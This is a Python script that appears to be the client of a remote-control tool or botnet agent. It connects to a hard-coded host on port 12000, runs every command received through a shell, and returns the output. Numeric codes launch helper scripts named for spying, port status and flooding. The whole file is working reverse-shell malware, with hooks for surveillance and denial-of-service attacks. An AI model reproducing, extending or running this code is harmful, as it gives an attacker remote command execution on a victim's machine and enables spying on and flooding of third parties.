import socket
import os
import subprocess

sock = socket.socket()
serverName = '192.168.2.26'
serverPort = 12000

sock.connect((serverName, serverPort))
    
while True:
    data = sock.recv(1024)
    
    if data[:2].decode("utf-8") == '1':
        exec(open('spy.py').read())

    if data[:2].decode("utf-8") == '2':
        exec(open('traceroute.py').read())
        
    if data[:2].decode("utf-8") == '3':
        exec(open('ping.py').read())

    if data[:2].decode("utf-8") == '4':
        exec(open('portStatus.py').read())

    if data[:2].decode("utf-8") == '5':
        exec(open('flood.py').read())
    
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
        
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        sock.send(str.encode(output_str + currentWD))

        print(output_str)


